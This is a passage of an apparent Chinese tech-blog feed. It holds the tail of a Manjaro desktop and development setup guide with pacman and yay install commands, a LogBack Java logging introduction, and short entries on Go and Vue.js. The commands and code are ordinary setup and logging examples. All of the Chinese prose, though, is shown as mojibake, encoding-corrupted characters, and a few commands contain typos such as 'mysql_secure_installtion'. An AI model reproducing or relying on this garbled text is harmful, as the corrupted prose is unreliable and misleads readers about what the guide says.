<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S redshift
</code></pre>
<h3><span class="ez-toc-section" id="Screenshot">Screenshot</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S deepin-screenshot
</code></pre>
<h2><span class="ez-toc-section" id="i-11">å¼€å‘ç¯å¢ƒ</span></h2>
<h3><span class="ez-toc-section" id="Vim">Vim</span></h3>
<p>æˆ‘æ˜¯ Vim å…šã€‚</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ git clone --depth=1 https://github.com/amix/vimrc.git ~/.vim_runtime
$ sh ~/.vim_runtime/install_awesome_vimrc.sh
</code></pre>
<h3><span class="ez-toc-section" id="Git">Git</span></h3>
<p>åœ¨ä¹‹å‰æˆ‘ä»¬å·²ç»å®‰è£…è¿‡äº† Gitï¼Œè¿™é‡Œä¸»è¦æ˜¯ä¸€äº› Git çš„åŸºæœ¬è®¾ç½®ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ git config --global user.name "Your_username"
$ git config --global user.email "your@email.com"
$ git config --global core.editor vim  # ä½¿ç”¨ Vim æ¥ç¼–è¾‘ Git æäº¤ä¿¡æ¯
</code></pre>
<blockquote><p>
  ä¸è¦å¿˜è®°æ·»åŠ ç”Ÿæˆå¹¶æ·»åŠ  GPG key å–”ï½
</p></blockquote>
<h3><span class="ez-toc-section" id="Docker">Docker</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S docker
$ sudo pacman -S docker-compose
</code></pre>
<h3><span class="ez-toc-section" id="Java">Java</span></h3>
<p><a href="https://wiki.archlinux.org/index.php/Java">Java - ArchWiki</a></p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S java-runtime-common java-environment-common
$ yay jdk8  # Select extra/jdk8-openjdk
</code></pre>
<p>ä½¿ç”¨ <code>archlinux-java</code> å‘½ä»¤æ¥ç®¡ç† Java ç¯å¢ƒã€‚</p>
<p>åˆ—ä¸¾ Java ç¯å¢ƒï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ archlinux-java status
</code></pre>
<p>é€‰æ‹© Java ç¯å¢ƒï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo archlinux-java set java-8-openjdk
</code></pre>
<h3><span class="ez-toc-section" id="Go">Go</span></h3>
<p><a href="https://wiki.archlinux.org/index.php/Go">Go - ArchWiki</a></p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S go go-tools
</code></pre>
<blockquote><p>
  å¯é€‰ç”¨ <code>gcc-go</code> ï¼Œä½†è‹¥éœ€è¦ä½¿ç”¨ JetBrains çš„ IDE åˆ™å¿…é¡»ä½¿ç”¨ <code>go</code> ï¼Œå¦åˆ™ IDE æ— æ³•åœ¨ <code>/usr/lib/go</code> ä¸‹æ‰¾åˆ° Go SDKã€‚
</p></blockquote>
<p>é…ç½®ç¯å¢ƒå˜é‡ <code>GOPATH</code> ï¼Œä¸ªäººåå¥½åœ¨ç”¨æˆ·ç›®å½•ä¸‹çš„ <code>go/</code> æ–‡ä»¶å¤¹æ”¾ç½® Go ç›¸å…³æ–‡ä»¶ã€‚</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ vim ~/.zshrc  # OR ~/.bashrc OR ~/.profile

export GOPATH=~/go
export PATH=$PATH:$GOPATH/bin
</code></pre>
<p>ç”±äºæŸäº›ç‰¹æ®Šçš„åŸå› ï¼Œå›½å†…æ— æ³•å¾ˆå¥½åœ°æ‹‰å– Go ç›¸å…³çš„è½¯ä»¶åŒ…ã€‚å»ºè®®ä½¿ç”¨ <a href="https://github.com/goproxy/goproxy.cn">goproxy/goproxy.cn</a> ï¼Œåªéœ€åœ¨æ‹‰å–å‰è¾“å…¥ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ export GOPROXY=https://goproxy.cn
</code></pre>
<h3><span class="ez-toc-section" id="MariaDB">MariaDB</span></h3>
<p><a href="https://wiki.archlinux.org/index.php/MariaDB">MariaDB- ArchWiki</a></p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S mariadb
# install MariaDB
$ sudo mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql
# start MariaDB
$ sudo systemctl start mariadb
# config MariaDB using interactive wizard
$ sudo mysql_secure_installtion
</code></pre>
<p>æ›´æ”¹é»˜è®¤ç¼–ç ä¸º <code>utf8mb4</code> ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-ini">$ sudo vim /etc/my.cnf

# append following lines
[client]
default-character-set = utf8mb4

[mysqld]
collation_server = utf8mb4_unicode_ci
character_set_server = utf8mb4

[mysql]
default-character-set = utf8mb4
</code></pre>
<p>é‡å¯ <code>MariaDB</code> ä»¥ç”Ÿæ•ˆã€‚</p>
<h3><span class="ez-toc-section" id="Redis">Redis</span></h3>
<p><a href="https://wiki.archlinux.org/index.php/Redis">Redis - ArchWiki</a></p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S redis
$ sudo systemctl start redis
</code></pre>
<h3><span class="ez-toc-section" id="Visual_Studio_Code">Visual Studio Code</span></h3>
<p><a href="https://wiki.archlinux.org/index.php/Visual_Studio_Code">Visual Studio Code - ArchWiki</a></p>
<p>å®‡å®™ç¬¬ä¸€ç¼–è¾‘å™¨ï¼</p>
<p>å¯ä»¥ä½¿ç”¨ Snapd æ¥å®‰è£…ï¼Œè§<a href="https://snapcraft.io/install/code/manjaro">è¿™é‡Œ</a>ã€‚ä¸è¿‡ç¬”è€…ç›´æ¥ç”¨ <code>pacman</code> å®‰è£…äº†ï¼Œå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S visual-studio-code-bin
</code></pre>
<h3><span class="ez-toc-section" id="Sublime_Text">Sublime Text</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S sublime-text-dev
</code></pre>
<h3><span class="ez-toc-section" id="JetBrains_Toolbox">JetBrains Toolbox</span></h3>
<p><a href="https://aur.archlinux.org/packages/jetbrains-toolbox/">AUR - JetBrains Toolbox</a></p>
<p>JetBrains å®¶çš„ IDE ä¸€åº”ä¿±å…¨ï¼Œåº”æœ‰å°½æœ‰ï¼</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S jetbrains-toolbox
# $ sudo pacman -S intellij-idea-ultimate-edition
</code></pre>
<h3><span class="ez-toc-section" id="Postman">Postman</span></h3>
<p>åç«¯å¼€å‘å¿…å¤‡ã€‚</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S postman
</code></pre>
<h2><span class="ez-toc-section" id="KDE">KDE æ’ä»¶</span></h2>
<ul>
<li>Resource Monitor</p>
</li>
<li>
<p>Netspeed Widget</p>
</li>
<li>
<p>Redshift-control</p>
</li>
<li>
<p>Active Window Control</p>
</li>
<li>
<p>Global Menu</p>
</li>
<li>
<p>Latte Dock</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S latte-dock
</code></pre>
</li>
</ul>
<h2><span class="ez-toc-section" id="KDE-2">KDE è®¾ç½®</span></h2>
<p>ä¸ªäººå–œæ¬¢çš„æ¡Œé¢è®¾ç½®ã€‚</p>
<h3><span class="ez-toc-section" id="Displays">Displays</span></h3>
<p>å±å¹• 120% æ”¾å¤§ï¼š <code>System Settings &gt; Displays &gt; Scale Display &gt; 1.2</code> ã€‚</p>
<h3><span class="ez-toc-section" id="Global_Menu">Global Menu</span></h3>
<p>å› ä¸ºæœ‰äº† Latte Dockï¼Œä¸å†éœ€è¦ä»»åŠ¡æ äº†ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯å…¨å±€èœå•ã€‚éœ€è¦æ·»åŠ  <code>Global Menu</code> çš„ Widgetã€‚</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ sudo pacman -S appmenu-gtk-module
$ sudo pacman -S libdbusmenu-glib  # For electron apps menu
</code></pre>
<p>è¯¦æƒ…è§<a href="https://forum.manjaro.org/t/gtk-global-menu-in-plasma-5-13/42112">æ­¤è´´</a> ã€‚</p>
<h3><span class="ez-toc-section" id="Screen_Locking">Screen Locking</span></h3>
<p><code>System Settings &gt; Desktop Behavior &gt; Screen Locking &gt; Keyboard Shortcut</code> è®¾ä¸º <code>Meta + L</code> ã€‚</p>
<h3><span class="ez-toc-section" id="Effects">Effects</span></h3>
<p>KDE æ¡Œé¢åŠ¨ç”»æ•ˆæœã€‚</p>
<p><code>System Settings &gt; Workspace Behavior &gt; Desktop Effects &gt; Configure Desktop Effects</code> ï¼Œè®¾ç½®ä½ å–œæ¬¢çš„æ¡Œé¢æ•ˆæœã€‚</p>
<h3><span class="ez-toc-section" id="Window_Effects">Window Effects</span></h3>
<p>çª—å£åˆ‡æ¢æ•ˆæœï¼š<code>System Settings &gt; Window Management &gt; Task Switcher &gt; Main &gt; Visualization</code> ï¼Œå»ºè®®ä½¿ç”¨ <code>Large Icons</code> ã€‚</p>
<h3><span class="ez-toc-section" id="Open_Files">Open Files</span></h3>
<p>KDE é»˜è®¤æ˜¯å•å‡»æ‰“å¼€æ–‡ä»¶ï¼Œä½†æ˜¯ç”¨ä¹ æƒ¯ Windows åŠ GNOME çš„æˆ‘ä¸æ˜¯å¾ˆä¹ æƒ¯ï¼Œé‚æ”¹ä¹‹ï¼š</p>
<p><code>System Settings &gt; Desktop Behavior &gt; Workspace &gt; Click Behavior &gt; Double-Click to open files and folders(single click to select)</code> .</p>
<h3><span class="ez-toc-section" id="Shortcuts">Shortcuts</span></h3>
<h4><span class="ez-toc-section" id="Global_Shortcuts">Global Shortcuts</span></h4>
<p><code>System Settings &gt; Shortcuts &gt; Global Shortcuts &gt; KWin</code></p>
<table>
<thead>
<tr>
<th align="left">Action</th>
<th align="left">Global</th>
</tr>
</thead>
<tbody>
<tr>
<td align="left">Switch One Desktop Down</td>
<td align="left">Meta+Ctrl+Down</td>
</tr>
<tr>
<td align="left">Switch One Desktop to the Left</td>
<td align="left">Meta+Ctrl+Left</td>
</tr>
<tr>
<td align="left">Switch One Desktop to the Right</td>
<td align="left">Meta+Ctrl+Right</td>
</tr>
<tr>
<td align="left">Switch One Desktop Up</td>
<td align="left">Meta+Ctrl+Up</td>
</tr>
<tr>
<td align="left">Window One Desktop Down</td>
<td align="left">Meta+Ctrl+Shift+Down</td>
</tr>
<tr>
<td align="left">Window One Desktop to the Left</td>
<td align="left">Meta+Ctrl+Shift+Left</td>
</tr>
<tr>
<td align="left">Window One Desktop to the Right</td>
<td align="left">Meta+Ctrl+Shift+Right</td>
</tr>
<tr>
<td align="left">Window One Desktop Up</td>
<td align="left">Meta+Ctrl+Shift+Up</td>
</tr>
<tr>
<td align="left">Maximize Window</td>
<td align="left">Meta+Up</td>
</tr>
<tr>
<td align="left">Minimize Windows</td>
<td align="left">Meta+Down</td>
</tr>
</tbody>
</table>
<p><code>System Settings &gt; Shortcuts &gt; Global Shortcuts &gt; Plasma</code></p>
<table>
<thead>
<tr>
<th align="left">Action</th>
<th align="left">Global</th>
</tr>
</thead>
<tbody>
<tr>
<td align="left">Open Klipper at Mouse Position</td>
<td align="left">Alt+D</td>
</tr>
</tbody>
</table>
<h4><span class="ez-toc-section" id="Custom_Shortcuts">Custom Shortcuts</span></h4>
<p><code>System Settings &gt; Shortcuts &gt; Custom Shortcuts &gt; Edit</code></p>
<p>Deepin Screenshot æˆªå±å¿«æ·é”®ï¼š</p>
<ul>
<li><code>New &gt; Global Shortcut &gt; Command/URL</code> æ–°å»ºå…¨å±€è‡ªå®šä¹‰å¿«æ·é”®</li>
<li><code>Trigger</code> ï¼š <code>Ctrl</code> + <code>Alt</code> + <code>A</code> </li>
<li><code>Action</code> ï¼š <code>deepin-turbo-invoker --type=dtkwidget deepin-screenshot --icon</code> </li>
</ul>
<h3><span class="ez-toc-section" id="Desktop_Folder_Settings">Desktop Folder Settings</span></h3>
<p><code>Right click on Desktop &gt; Configure Desktop... &gt; Mouse Actions</code></p>
<p>åˆ é™¤ <code>Vertical-Scroll</code> æ¡ç›®ï¼ˆå–æ¶ˆæ»šåŠ¨åˆ‡æ¢å·¥ä½œåŒºï¼‰ã€‚</p>
<h2><span class="ez-toc-section" id="i-12">ä¸»é¢˜</span></h2>
<h3><span class="ez-toc-section" id="Adapta">Adapta</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ yay -S adapta-kde kvantum-theme-adapta adapta-gtk-theme
</code></pre>
<h2><span class="ez-toc-section" id="References">References</span></h2>
<ul>
<li><a href="https://yqsas.com/2019/03/03/manjaro-in-t480s/">æŠ˜è…¾ä¹‹ Manjaro å®‰è£…ä½¿ç”¨æŒ‡åŒ—</a></li>
<li><a href="http://dejary.top/2019/01/23/Manjaro%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/">Manjaro è¸©å‘è®°å½•</a></li>
<li><a href="https://www.jianshu.com/p/f2c9ee00698c">Manjaro åˆçº§å…¥é—¨</a></li>
<li><a href="[https://vidotto.top/post/manjaro-å®‰è£…é…ç½®å¤‡å¿˜/](https://vidotto.top/post/manjaro-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E5%A4%87%E5%BF%98/)">Manjaro å®‰è£…é…ç½®å¤‡å¿˜</a></li>
<li><a href="https://ruiming.me/manjaro-linux/">Manjaro Linux è¿ç§»è®°</a></li>
</ul>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/manjaro-quick-start/">å°†å¹²å‡€çš„ Manjaro å¿«é€Ÿé…ç½®ä¸ºå·¥ä½œç¯å¢ƒ</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/java-logback-intro/</id>
        <title><![CDATA[Java æ—¥å¿—åŒ… LOGBack ç®€ä»‹]]></title>
        <updated>2019-07-29T15:18:36+08:00</updated>
        <link href="https://blog.triplez.cn/java-logback-intro/"/>
        <content type="text/html" src="https://blog.triplez.cn/java-logback-intro/"><![CDATA[<h2><span class="ez-toc-section" id="i">åŒ…ç²’åº¦çº§åˆ«ç»§æ‰¿</span></h2>
<p>ä¸‹çº§çš„åŒ…è‹¥æ— ç‰¹å®šè®¾å®šæ—¥å¿—çº§åˆ«ï¼Œåˆ™ä¼šç»§æ‰¿ä¸Šå±‚åŒ…çš„æ—¥å¿—çº§åˆ«ã€‚</p>
<p>å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p>
<table>
<thead>
<tr>
<th>æ—¥å¿—å™¨ï¼ˆåŒ…åï¼‰</th>
<th>åˆ†é…æ—¥å¿—çº§åˆ«</th>
<th>ç”Ÿæ•ˆæ—¥å¿—çº§åˆ«</th>
</tr>
</thead>
<tbody>
<tr>
<td>root</td>
<td>WARN</td>
<td>WARN</td>
</tr>
<tr>
<td>cn.triplez</td>
<td>none</td>
<td>WARN</td>
</tr>
<tr>
<td>cn.triplez.demo</td>
<td>DEBUG</td>
<td>DEBUG</td>
</tr>
</tbody>
</table>
<h2><span class="ez-toc-section" id="i-2">æ—¥å¿—çº§åˆ«ä¼˜å…ˆçº§</span></h2>
<p><code>TRACE</code> &lt; <code>DEBUG</code> &lt; <code>INFO</code> &lt; <code>WARN</code> &lt; <code>ERROR</code></p>
<h2><span class="ez-toc-section" id="i-3">è·å–æ—¥å¿—å™¨</span></h2>
<p>å¤šæ¬¡è·å–ç›¸åŒåç§°çš„æ—¥å¿—å™¨åˆ™ä¼šè¿”å›ç›¸åŒå¯¹è±¡çš„å¼•ç”¨ã€‚</p>
<h2><span class="ez-toc-section" id="Appenders_and_Layouts">Appenders and Layouts</span></h2>
<h2><span class="ez-toc-section" id="i-4">åœ¨æ—¥å¿—ä¸­æ’å…¥å˜é‡å€¼</span></h2>
<p>å‡å¦‚ä½ æƒ³å†™ä¸€æ¡è°ƒè¯•æ—¥å¿—ï¼Œå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">logger.debug("Entry number: " + i + " is " + String.valueOf(entry[i]));
</code></pre>
<p>è¿™æ ·çš„ä»£ç è¿è¡Œæ•ˆç‡æ˜¯å¾ˆä½çš„ï¼Œå› ä¸ºè¯¥è¯­å¥ä¼šå…ˆæ‹¼æ¥æ—¥å¿—å­—ç¬¦ä¸²ï¼Œå†è¿›è¡Œæ˜¯å¦ç¬¦åˆ <code>DEBUG</code> å±‚çº§çš„åˆ¤æ–­ã€‚å› æ­¤ï¼Œä½ å¯ä»¥å†™æˆå¦‚ä¸‹å½¢å¼ä»¥æé«˜è¿è¡Œé€Ÿåº¦ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">if (logger.isDebugEnabled()) {
  logger.debug("Entry number: " + i + " is " + String.valueOf(entry[i]));
}
</code></pre>
<h3><span class="ez-toc-section" id="i-5">æ›´å¥½åœ°æ–¹æ³•</span></h3>
<p>äº‹å®ä¸Šï¼Œåœ¨ LOGBack ä¸­æä¾›äº†æ›´å¥½çš„æ‹¼æ¥æ–¹æ³•ï¼Œå…¶èƒ½å¤ŸåŸºäºæ¨¡æ¿å¡«å……å˜é‡ã€‚éœ€è¦å¡«å……çš„å˜é‡åªéœ€åœ¨æ¨¡æ¿ä¸­ç”¨ <code>{}</code> ä»£æ›¿å³å¯ï¼Œè€Œä¸”è¯¥æ–¹æ³•æœ‰å¾ˆå¥½çš„æ€§èƒ½<sup id="fnref-863-1"><a href="#fn-863-1" class="jetpack-footnote">1</a></sup>ï¼Œå®ƒèƒ½å¤Ÿå…ˆåˆ¤æ–­æ—¥å¿—å±‚çº§å†è¿›è¡Œå­—ç¬¦ä¸²çš„å¤„ç†ã€‚ä¸¾ä¸ªæ —å­ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">logger.debug("Hello, {}!", name);
</code></pre>
<p>ä¹Ÿå¯ä»¥å†™å¤šä¸ªå˜é‡ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">logger.debug("Hello, {}! I'm {}.", name, yourName);
</code></pre>
<p>å¦‚æœæœ‰å¾ˆå¤šä¸ªå˜é‡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ <code>Object[]</code> æ¥æ•´åˆï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">Object[] paramArray = {val1, val2, val3};
logger.debug("Value 1: {}, Value 2: {}, Value 3: {}", paramArray);
</code></pre>
<h2><span class="ez-toc-section" id="i-6">ä¸€ç¥å†…éƒ¨åŸç†</span></h2>
<p>æ—¶åºå›¾ï¼š</p>
<p><img src="https://logback.qos.ch/manual/images/chapters/architecture/underTheHoodSequence2.gif" alt="sequence diagram" /></p>
<h2><span class="ez-toc-section" id="i-7">æ€§èƒ½</span></h2>
<h3><span class="ez-toc-section" id="i-8">å®Œå…¨å…³é—­æ—¥å¿—è®°å½•åŠŸèƒ½</span></h3>
<p>å½“æ—¥å¿—åŠŸèƒ½åœ¨è®¾ç½®æ–‡ä»¶ä¸­è¢«è®¾ç½®ä¸º <code>Level.OFF</code>ï¼Œ æ—¥å¿—åŠŸèƒ½ä¼šè¢«å…³é—­ã€‚ä½†æ˜¯ï¼Œå†™åœ¨ç¨‹åºä¸­çš„ <code>log</code> è¯­å¥ä»ä¼šäº§ç”Ÿä¸€å®šçš„å¼€é”€ï¼Œä¸»è¦æ˜¯æ–¹æ³•è°ƒç”¨å’Œæ•´æ•°æ¯”è¾ƒã€‚ä¸è¿‡è¿™ä¸ªå¼€é”€éå¸¸ä¹‹å°ï¼Œæˆ‘ä»¬å®Œå…¨ä¸ç”¨æ‹…å¿ƒã€‚</p>
<p>ä¸è¿‡ï¼Œåœ¨æŸäº›å†™æ³•ä¹‹ä¸‹ï¼Œæ–¹æ³•è°ƒç”¨ä¼šäº§ç”Ÿéšè—çš„å˜é‡æ„å»ºçš„å¼€é”€ï¼Œè¿™ä¸€ç‚¹åœ¨å‰é¢å·²ç»æè¿‡ï¼Œä¸¾ä¸ªæ —å­ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">x.debug("Entryu number: " + i + "is " + entry[i]);
</code></pre>
<p>å¦‚ä¸Šçš„å†™æ³•ä¼šäº§ç”Ÿé¢å¤–çš„å­—ç¬¦ä¸²æ‹¼æ¥æˆæœ¬ï¼Œå…¶éœ€è¦å°† <code>i</code> å’Œ <code>entry[i]</code> éƒ½è½¬æ¢æˆä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶å°†å››ä¸ªå­—ç¬¦ä¸²å¯¹è±¡æ‹¼æ¥èµ·æ¥ã€‚è€Œè¿™ä¸ªè¿‡ç¨‹æ˜¯ä¸æœ‰æ•ˆå±‚çº§æ— å…³çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ— è®ºæ˜¯å¦æ»¡è¶³è¾“å‡ºè¯¥æ¡æ—¥å¿—çš„æ¡ä»¶ï¼Œéƒ½ä¼šè¿›è¡Œå­—ç¬¦ä¸²çš„æ‹¼æ¥æ“ä½œã€‚</p>
<p>ä¸ºäº†é¿å…äº§ç”Ÿè¿™ç§é¢å¤–çš„è¿è¡Œå¼€é”€ï¼Œæé«˜ç¨‹åºè¿è¡Œæ•ˆç‡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ SLF4J çš„å˜é‡åŒ–æ—¥å¿—è®°å½•æ¥å£ï¼š</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">x.debug("Entry number: {} is {}", i, entry[i]);
</code></pre>
<p>è¿™ç§å˜ä½“å†™æ³•ä¸ä¼šäº§ç”Ÿé¢å¤–çš„å˜é‡æ„å»ºæˆæœ¬ï¼Œæ—¥å¿—ä¿¡æ¯åªæœ‰è¯¥æ—¥å¿—è¯·æ±‚è¢«å‘é€åˆ°è¿½åŠ å™¨ï¼ˆå³æ»¡è¶³è®°å½•è¦æ±‚åŠè¾“å‡ºå±‚çº§ï¼‰ä¹‹åæ‰ä¼šè¢«æ ¼å¼åŒ–ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•ç»è¿‡äº†ä¼˜åŒ–å¤„ç†ï¼Œèƒ½å¤Ÿå¾ˆå¤§ç¨‹åº¦æé«˜è¿è¡Œæ•ˆç‡ã€‚</p>
<blockquote><p>
  ä¸å»ºè®®åœ¨å¾ªç¯ä¸­ä½¿ç”¨æ—¥å¿—è®°å½•ï¼Œå³ä½¿ä¸è®°å½•æ—¥å¿—ä¹Ÿä¼šäº§ç”Ÿé¢å¤–çš„å¼€é”€ï¼Œè®°å½•äº†æ—¥å¿—ä¹Ÿä¼šè¾“å‡ºå¤§é‡çš„é‡å¤æ— ç”¨ä¿¡æ¯ã€‚
</p></blockquote>
<h3><span class="ez-toc-section" id="i-9">æ—¥å¿—å™¨åœ¨æ£€æŸ¥æ—¥å¿—å±‚çº§çš„æ€§èƒ½</span></h3>
<p>åœ¨ LOGBack ä¸­ï¼Œæ—¥å¿—å™¨ä¸éœ€è¦æ ¹æ®ç»§æ‰¿å…³ç³»å»å¯»æ‰¾è‡ªå·±çœŸæ­£æ‰€å¯¹åº”çš„è®°å½•å±‚çº§ï¼Œåœ¨æ—¥å¿—å™¨è¢«åˆ›å»ºä¹‹åï¼Œç»§æ‰¿å…³ç³»å°±ä¼šç¡®å®šå¹¶ä¸”ç¡®å®šäº†è¯¥æ—¥å¿—å™¨è‡ªèº«çš„è®°å½•å±‚çº§ã€‚å¹¶ä¸”æ›´æ”¹äº†æŸä¸ªçˆ¶è®°å½•å™¨çš„è®°å½•å±‚çº§ä¹‹åï¼Œç›¸å¯¹åº”çš„å­è®°å½•å™¨éƒ½ä¼šè¢«å‘é€è¯·æ±‚ä»¥æ›´æ”¹è®°å½•å±‚çº§ã€‚å› æ­¤ï¼Œåœ¨æ¯”è¾ƒæ—¥å¿—å±‚çº§æ—¶ï¼Œæ—¥å¿—å™¨èƒ½å¤Ÿåšåˆ°å‡†å³æ—¶çš„å†³ç­–ï¼Œè€Œä¸éœ€è¦åœ¨æ­¤å¤„å»è¯·æ±‚çˆ¶è®°å½•å™¨æ‰èƒ½åšå‡ºå†³ç­–ã€‚</p>
<h3><span class="ez-toc-section" id="i-10">æ—¥å¿—è¾“å‡º</span></h3>
<p>æ—¥å¿—çœŸæ­£è¢«è¾“å‡ºåˆ°æ–‡ä»¶æˆ–æµä¸­æ˜¯å¼€é”€æœ€å¤§è¶Šæ˜¯æœ€ä¸ºè´¹æ—¶çš„æ“ä½œã€‚ä»æ—¥å¿—å¼€å§‹è®°å½•åˆ°å†™å…¥æ–‡ä»¶ç³»ç»Ÿä¸­çš„å…¸å‹å¼€é”€æ˜¯ 9 åˆ° 12 æ¯«ç§’ï¼Œè‹¥ä¸ºå†™åˆ°è¿œç«¯æ•°æ®åº“æˆ–æœåŠ¡å™¨ä¼šå†å¢åŠ å‡ æ¯«ç§’çš„å»¶æ—¶ã€‚å°½ç®¡ LOGBack çš„åŠŸèƒ½éå¸¸ä¸°å¯Œï¼Œä½†æ˜¯ LOGBack çš„æ ¸å¿ƒä¾ç„¶æ˜¯ä¿è¯è¿è¡Œæ•ˆç‡ï¼Œå¼€å‘è€…ä»¬å·²å¤šæ¬¡ä¸ºäº†å¾—åˆ°æ›´å¥½åœ°æ€§èƒ½é‡æ„ LOGBack ç»„ä»¶ã€‚</p>
<div class="footnotes">
<hr />
<ol>
<li id="fn-863-1">
å®˜æ–¹æŒ‡å‡ºå¯¹æ¯”ç›´æ¥æ‹¼æ¥å­—ç¬¦ä¸²çš„æ–¹æ³•èƒ½å¤Ÿè‡³å°‘æé«˜ 30% çš„æ€§èƒ½ã€‚&#160;<a href="#fnref-863-1">&#8617;</a>
</li>
</ol>
</div>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/java-logback-intro/">Java æ—¥å¿—åŒ… LOGBack ç®€ä»‹</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/06/go-internal-note/</id>
        <title><![CDATA[ã€Šæ·±å…¥è§£æGoã€‹ç¬”è®°]]></title>
        <updated>2019-06-24T08:40:49+08:00</updated>
        <link href="https://blog.stdioa.com/2019/06/go-internal-note/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/06/go-internal-note/"><![CDATA[<!-- build time:Mon Jun 24 2019 16:41:29 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´) --><p>åœ¨ GitHub ä¸Šæ‰¾åˆ°ä¸€æœ¬è§£è¯» Go å®ç°ç»†èŠ‚çš„å¥½ä¹¦ï¼Œåå«<a href="https://github.com/tiancaiamao/go-internals/" target="_blank" rel="noopener">ã€Šæ·±å…¥è§£æ Goã€‹</a>ã€‚<br>å¤§è‡´çœ‹äº†ä¸€éï¼Œç®€å•åšäº†äº›ç¬”è®°ã€‚</p>]]></content>
        <author>
            <name><![CDATA[Stdioâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/06/golang-learning-experience/</id>
        <title><![CDATA[Golang å­¦ä¹ è®°å½•]]></title>
        <updated>2019-06-24T08:25:39+08:00</updated>
        <link href="https://blog.stdioa.com/2019/06/golang-learning-experience/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/06/golang-learning-experience/"><![CDATA[<!-- build time:Mon Jun 24 2019 16:41:29 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´) --><p>è¿™å‡ ä¸ªæœˆåœ¨è€ƒè™‘ä» Python è½¬å‘ Golangï¼Œæ‰€ä»¥ä¸“é—¨å­¦ä¹ äº† Golang.<br>è¿™é‡Œæ˜¯ Golang å­¦ä¹ çš„ä¸€äº›è®°å½•ã€‚</p>]]></content>
        <author>
            <name><![CDATA[Stdioâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/05/find-minn-with-heap/</id>
        <title><![CDATA[ç”¨å †æ‰¾å‡ºæœ€å°çš„ N ä¸ªæ•°]]></title>
        <updated>2019-05-21T08:46:12+08:00</updated>
        <link href="https://blog.stdioa.com/2019/05/find-minn-with-heap/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/05/find-minn-with-heap/"><![CDATA[<!-- build time:Wed Jun 19 2019 17:59:18 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´) --><p>ä¸çŸ¥é“ä¸ºå•¥ï¼Œçªç„¶æƒ³æ°´ä¸€ç¯‡å¾ˆæ°´çš„ç®—æ³•æ–‡ç« ã€‚</p>]]></content>
        <author>
            <name><![CDATA[Stdioâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/vue-demo-instruction/</id>
        <title><![CDATA[Vue.js ä»å…¥å‘åˆ°å…¥åœŸ]]></title>
        <updated>2019-04-23T13:25:25+08:00</updated>
        <link href="https://blog.creedowl.com/posts/vue-demo-instruction/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/vue-demo-instruction/"><![CDATA[<h1 id="vuejs-ä»å…¥å‘åˆ°å…¥åœŸ">Vue.js ä»å…¥å‘åˆ°å…¥åœŸ</h1>
